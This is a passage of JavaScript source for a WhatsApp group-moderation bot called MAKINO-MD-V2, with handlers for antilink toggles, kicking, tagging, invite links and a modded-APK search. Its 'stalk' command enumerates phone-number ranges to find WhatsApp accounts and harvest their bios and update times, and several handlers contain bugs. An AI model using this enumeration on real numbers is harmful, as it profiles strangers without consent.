          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLink) return reply('Already deactivated!')
          let off = ntilink.indexOf(from)
          ntilink.splice(off, 1)
          reply('Deactivated _Antilink_ in this group!')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinkgc on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
        }
      }
        break;


      case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkYoutubeVid) return reply('Already activated')
          ntilinkytvid.push(from)
          reply('Activated youtube video antilink !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkYoutubeVid) return reply('Already deactivated')
          let off = ntilinkytvid.indexOf(from)
          ntilinkytvid.splice(off, 1)
          reply('Deactivated youtube video antilink !')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinkyoutubevideo on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinkyoutubevideo off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
        }
      }
        break;


      case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkYoutubeChannel) return reply('Already activated')
          ntilinkytch.push(from)
          reply('Activated youtube channel antilink !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkYoutubeChannel) return reply('Already deactivated')
          let off = ntilinkytch.indexOf(from)
          ntilinkytch.splice(off, 1)
          reply('Deactivated youtube channel antilink !')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinkyoutubech on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinkyoutubech off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
        }
      }
        break;


      case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkInstagram) return reply('Already activated')
          ntilinkig.push(from)
          reply('Activated instagram antilink !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkInstagram) return reply('Already deactivated')
          let off = ntilinkig.indexOf(from)
          ntilinkig.splice(off, 1)
          reply('Deactivated instagram antilink !')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinkinstagram on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinkinstagram off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off`, `${global.BotName}`, m)
        }
      }
        break;


      case 'antilinkfacebook': case 'antilinkfb': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkFacebook) return reply('Already activated')
          ntilinkfb.push(from)
          reply('Activated facebook antilink !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkFacebook) return reply('Already deactivated')
          let off = ntilinkfb.indexOf(from)
          ntilinkfb.splice(off, 1)
          reply('Deactivated facebook antilink !')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinkfacebook on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinkfacebook off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
        }
      }
        break;


      case 'antilinktelegram': case 'antilinktg': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkTelegram) return reply('Already activated')
          ntilinktg.push(from)
          reply('Activated telegram antilink !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkTelegram) return reply('Already deactivated')
          let off = ntilinkig.indexOf(from)
          ntilinkig.splice(off, 1)
          reply('Deactivated telegram antilink in this group')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinktelegram on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinktelegram off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below On / Off `, `${global.BotName}`, m)
        }
      }
        break;


      case 'antilinktiktok': case 'antilinktt': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkTiktok) return reply('Already activated')
          ntilinktt.push(from)
          reply('Activated tiktok antilink !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkTiktok) return reply('Already deactivated')
          let off = ntilinktt.indexOf(from)
          ntilinktt.splice(off, 1)
          reply('Deactivated tiktok antilink !')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinktiktok on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinktiktok off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
        }
      }
        break;


      case 'antilinktwt': case 'antilinktwitter': case 'antilinktwit': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (AntiLinkTwitter) return reply('Already activated')
          ntilinktwt.push(from)
          reply('Activated twitter antilink in this group !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!AntiLinkTwitter) return reply('Already deactivated')
          let off = ntilinktwt.indexOf(from)
          ntilinktwt.splice(off, 1)
          reply('Deactivated twitter antilink !')
        } else {
          let buttonsntilink = [
            { buttonId: `${prefix}antilinktwt on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antilinktwt off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntilink, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
        }
      }
        break;

      case 'antilinkall': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } });

        if (args[0] === "on") {

          if (AntiLinkAll) return reply('Already activated');
          ntilinkall.push(from);
          reply('Enabled all antilink!');
          var groupe = await Taira.groupMetadata(from);
          var members = groupe['participants'];
          var mems = [];
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          Taira.sendMessage(from, { text: `\`\`\`「 Warning 」\`\`\`\n\nAntilink System Activated!`, contextInfo: { mentionedJid: mems } }, { quoted: m });
        } else if (args[0] === "off") {
          if (!AntiLinkAll) return reply('Already deactivated');
          let off = ntilinkall.indexOf(from);
          ntilinkall.splice(off, 1);
          reply('Disabled all antilink!');
        } else {
          reply(`Please use '${prefix}antilinkall on' to enable the Antilink system or '${prefix}antilinkall off' to disable it.`);
        }
      }
        break;


      case 'antiwame': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        if (args[0] === "on") {
          if (antiWame) return reply('Already activated')
          ntwame.push(from)
          reply('Activated antiwame !')
          var groupe = await Taira.groupMetadata(from)
          var members = groupe['participants']
          var mems = []
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
          })
          Taira.sendMessage(from, { text: `\`\`\`*「  Warning  」*\`\`\`\n\nAntilink is enabled!`, contextInfo: { mentionedJid: mems } }, { quoted: m })
        } else if (args[0] === "off") {
          if (!antiWame) return reply('Already deactivated')
          let off = nttoxic.indexOf(from)
          ntwame.splice(off, 1)
          reply('Deactivated antiwame !')
        } else {
          let buttonsntwame = [
            { buttonId: `${prefix}antiwame on`, buttonText: { displayText: 'On' }, type: 1 },
            { buttonId: `${prefix}antiwame off`, buttonText: { displayText: 'Off' }, type: 1 }
          ]
          await Taira.sendButtonText(m.chat, buttonsntwame, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.BotName}`, m)
        }
      }
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//

      //-----------------------------------------------------------------------------------------------------------------------------------//


      case 'listonline': case 'listaktif': case 'here': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
        let online = [...Object.keys(store.presences[id]), botNumber]
        let liston = 1
        Taira.sendText(m.chat, '  「 *Online Members* 」\n\n' + online.map(v => `${liston++} . @` + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      }
        break;


      //-----------------------------------------------------------------------------------------------------------------------------------//

      case 'happymod': case 'modapk': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "🔍", key: m.key } });
        if (!args.join(" ")) return reply(`Example: ${prefix + command} Kinemaster`);
        const searchTerm = args.join(" ");
        modapk.happymod(searchTerm).then(async (res) => {
          let teks = '```「 HappyMod Search Engine 」```';
          for (let i of res) {
            teks += `\n\n${i.name}\n`;
            teks += `${i.link}`;
	  }
          let messageToSend = teks;
          if (res[0].icon) {
            messageToSend = {
              text: teks,
              image: { url: res[0].icon },
              jpegThumbnail: Thumb,
            };
	  }
          Taira.sendMessage(from, messageToSend, { quoted: m });
        });
      }
        break;



      //-----------------------------------------------------------------------------------------------------------------------------------//


      //group moderation

      case 'banchat': case 'bangroup': case 'banmode': {
        if (isBan) return reply(mess.banned);
        if (!isCreator) return reply(mess.botowner);
        Taira.sendMessage(from, { react: { text: "⚠️", key: m.key } })
        if (args[0] === "on") {
          if (isBanChat) return reply('This Group is Already Banned from using ♱MAKINO-MD-V2♱♡⃤');
          banchat.push(from);
          reply('This Group has been banned from using ♱MAKINO-MD-V2♱♡⃤!');
          var groupe = await Taira.groupMetadata(from);
          var members = groupe['participants'];
          var mems = [];
          members.map(async adm => {
            mems.push(adm.id.replace('c.us', 's.whatsapp.net'));
          });
          Taira.sendMessage(from, { text: `\`\`\`「 Notice 」\`\`\`\n\nThis group is banned from using the bot. So, here nobody can use me anymore!`, contextInfo: { mentionedJid: mems } }, { quoted: m });
        } else if (args[0] === "off") {
          if (!isBanChat) return reply('This Group is Already Banned from using ♱MAKINO-MD-V2♱♡⃤!');
          let off = banchat.indexOf(from);
          banchat.splice(off, 1);
          reply('This Group has been *unbanned* from using ♱MAKINO-MD-V2♱♡⃤!');
        } else {
          reply('Please choose either *"on"* or *"off"* to ban or unban the group from using the bot.');
        }
      }
        break;


      case 'setname': case 'setsubject': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!text) return reply('Pls enter .setname <New Group Name>  to change this Group Name')
        await Taira.groupUpdateSubject(m.chat, text).then((res) => reply(mess.jobdone)).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'block': {
        //if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await reply("User successfully blocked")
        await Taira.updateBlockStatus(users, 'block').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'unblock': {
        //if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await relly("User successfully unblocked")
        await Taira.updateBlockStatus(users, 'unblock').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'setdesc': case 'setdesk': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!text) return reply('Pls enter -setname <New Group Description>  to change this Group Description.')
        await Taira.groupUpdateDescription(m.chat, text).then((res) => reply(mess.jobdone)).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'setgrouppp': case 'setgruppp': case 'setgcpp': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!quoted) return reply(`Send/reply Image With Caption ${prefix + command}`)
        if (!/image/.test(mime)) return reply(`Send/reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
        if (/webp/.test(mime)) return reply(`Send/reply Image With Caption ${prefix + command} to change the Profile Pic of this group.`)
        let media = await Taira.downloadAndSaveMediaMessage(quoted)
        await Taira.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
        reply(mess.jobdone)
      }
        break;


      case 'tagall': case 'all': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "😳", key: m.key } })
        let teks = `♱MAKINO-MD-V2♱♡⃤

*Message : ${args.join(" ") ? args.join(" ") : 'no message'}*\n\n ${readmore}`
        for (let mem of participants) {
          teks += `🏷️ @${mem.id.split('@')[0]}\n`
        }
        Taira.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: statrp })
      }
        break;


      case 'hidetag': case 'tag': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "😎", key: m.key } })
        Taira.sendMessage(m.chat, { text: args.join(" ") ? args.join(" ") : '', mentions: participants.map(a => a.id) }, { quoted: m })
      }
        break;

		    
	case 'ping': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        Taira.sendMessage(from, { react: { text: "💧", key: m.key } })
    const startTime = new Date();
  const pingMsg = await Taira.sendMessage(m.chat, { text: '*♱MAKINO-MD-V2♱♡⃤...*' }, { quoted: statrp });

 await Taira.relayMessage(m.chat, {
      protocolMessage: {
        key: pingMsg.key,
        type: 14,
        editedMessage: {
          conversation: `*♱MAKINO-MD-V2♱♡⃤ response speed* *${new Date() - startTime}* ms`
        }
      }
    }, {});
  } 
        break

      case 'tagadmins': case 'tagadmin': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🗿", key: m.key } })
        //if (!text) return reply(`*Please quote or write a meaningful message to tag admins to*`)
        let teks = `*「 Tag Admins 」*

*Message : ${text}*\n\n`
        for (let mem of groupAdmins) {
          teks += `🍁 @${mem.split('@')[0]}\n`
        }
        Taira.sendMessage(m.chat, { text: teks, mentions: groupAdmins }, { quoted: m })
      }
        break;


      case 'kickall': {
        mess
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
	 Taira.sendMessage(from, { react: { text: "🥺", key: m.key } })
        const delay = time => new Promise(res => setTimeout(res, time));
        let mentioned = participants.map(v => v.jid)
	await reply("Kicking all members")
        for (let member of mentioned) {
          Taira.groupParticipantsUpdate(m.chat, [member], 'remove')
        }
      }

        break;

        case 'jid': case 'getjid': {
	  Taira.sendMessage(from, { react: { text: "💧", key: m.key } })
          await Taira.sendMessage(m.chat, {text: `${m.chat}`}, { quoted: m})
        }
	break 


      case 'nowa': case 'find': case 'stalk': case 'stalknumber': {
        if (isBan) return reply(mess.banned);
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!args[0]) return reply(`Use command like: ${prefix}stalk <number>xxx`)
        var inputnumber = args[0]
        if (!inputnumber.includes('x')) return reply('You did not add x')
        reply(`Searching for WhatsApp account in given range...`)
        reply(`Please wait while i fetch details...`)
        function countInstances(string, word) {
          return string.split(word).length - 1;
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx;
        if (random_length == 1) {
          randomxx = 10
        } else if (random_length == 2) {
          randomxx = 100
        } else if (random_length == 3) {
          randomxx = 1000
        }
        var nomerny = `*『 List of Whatsapp Numbers 』*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within the range you provided*\n`
        for (let i = 0; i < randomxx; i++) {
          var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
          var status1 = nu[Math.floor(Math.random() * nu.length)]
          var status2 = nu[Math.floor(Math.random() * nu.length)]
          var status3 = nu[Math.floor(Math.random() * nu.length)]
          var dom4 = nu[Math.floor(Math.random() * nu.length)]
          var rndm;
          if (random_length == 1) {
            rndm = `${status1}`
          } else if (random_length == 2) {
            rndm = `${status1}${status2}`
          } else if (random_length == 3) {
            rndm = `${status1}${status2}${status3}`
          } else if (random_length == 4) {
            rndm = `${status1}${status2}${status3}${dom4}`
          }
          var anu = await Taira.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`);
          var anuu = anu.length !== 0 ? anu : false
          try {
            try {
              var anu1 = await Taira.fetchStatus(anu[0].jid)
            } catch {
              var anu1 = '401'
            }
            if (anu1 == '401' || anu1.status.length == 0) {
              nobio += `wa.me/${anu[0].jid.split("@")[0]}\n`
            } else {
              nomerny += `🪄 *Number:* wa.me/${anu[0].jid.split("@")[0]}\n🔹 *Bio :* ${anu1.status}\n🔸 *Updated On :* ${moment(anu1.setAt).tz('Asia/Kolkata').format('HH:mm:ss DD/MM/YYYY')}\n\n`
            }
          } catch {
            nowhatsapp += `${number0}${i}${number1}\n`
          }
        }
        reply(`${nomerny}${nobio}${nowhatsapp}`)
      }
        break;


      case 'invite': case 'gclink': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
	if (!isAdmins) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🪄", key: m.key } })
        let response = await Taira.groupInviteCode(m.chat)
        Taira.sendMessage(m.chat, {
          text: `*Group Name:* *${groupMetadata.subject}* \n\n*Group Link :* \nhttps://chat.whatsapp.com/${response}\n\n♱MAKINO-MD-V2♱♡⃤`, "contextInfo": {
            "forwardingScore": 1000000000,
            isForwarded: true,
          }
        }, { quoted: m, detectLink: true })
      }
        break;


      
      case 'revoke':
      case 'resetlink': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } }).then((res) => reply(`Group link successfully revoked!`)).catch((err) => reply(jsonformat(err)))
        Taira.groupRevokeInvite(m.chat)
	let response = await Taira.groupInviteCode(m.chat)
	Taira.sendMessage(m.chat, { text: `*New Group Link :* \nhttps://chat.whatsapp.com/${response}`}, { quoted: statrp })
      }
        break;

	case 'mute': case 'mutegc': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        await Taira.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Group has been successfully closed!`)).catch((err) => reply(jsonformat(err)))
	}
        break;
		    
	case 'unmute': case 'unmutegc': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        await Taira.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Group has been successfully unmuted!`)).catch((err) => reply(jsonformat(err)))
	}
         break
	
      case 'promote': case 'admin': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await reply(citel.pushname(users) + "promoted successfully")
        await Taira.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'demote': case 'unadmin': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await reply(citel.pushname(users) + "demoted successfully")
        await Taira.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
      }
        break;


      case 'add': {
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })


        let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        if (users.length == 0) return reply(`Please write the number of the person you want to add to thhis group`)
        await Taira.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => reply(`User Added Successfully!`)).catch((err) => reply(`Cannot add that user to this group!`))
      }
        break;


      case 'inviteuser': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })

        if (!text) return reply(`Enter the number you want to invite to the group...\n\nExample :\n*${prefix + command}* 2347080968564`)
        if (text.includes('+')) return reply(`Enter the number together without *+*`)
        if (isNaN(text)) return reply(`Enter only the numbers plus your country code without spaces`)
        let group = m.chat
        let link = 'https://chat.whatsapp.com/' + await Taira.groupInviteCode(group)
        await Taira.sendMessage(text + '@s.whatsapp.net', { text: ` *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender] })
        reply(` An invite link is sent to the user`)
      }
        break;


      case 'kick': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!m.isGroup) return reply(mess.grouponly);
        if (!isBotAdmins) return reply(mess.botadmin);
        if (!isAdmins && !isCreator) return reply(mess.useradmin)
        Taira.sendMessage(from, { react: { text: "🦶", key: m.key } })
        let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
        await Taira.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(`User Successfully kicked !`)).catch((err) => reply(jsonformat(err)))
      }
        break;


      // join command  is a possible to Ban bot number.
      case 'join': {
        if (isBan) return reply(mess.banned);
        if (isBanChat) return reply(mess.bangc);
        if (!isCreator) return reply(mess.botowner)
        Taira.sendMessage(from, { react: { text: "🫡", key: m.key } })
        if (!args[0]) return reply(`provide a group please`)
        vdd = args[0] || m.quoted
        let vcc = vdd.split("https://chat.whatsapp.com/")[1]
        if (!vcc) return reply("invite Link is invalid!")
        if (isCreator) {
          await Taira.groupAcceptInvite(vcc).then(async (res) => reply(jsonformat(res))).catch(_ => _)
          reply("Successfully joined group!")
        } else {
          Taira.query({
            tag: "iq",
            attrs: {
              type: "get",
              xmlns: "w:g2",
              to: "@g.us"
            },
            content: [{ tag: "invite", attrs: { code: vcc } }]
          }).then(async (res) => {
            sizny = res.content[0].attrs.size
            if (sizny < 20) {
              teks = `Sorry, munimun 20 members are required in a group to add bot!`
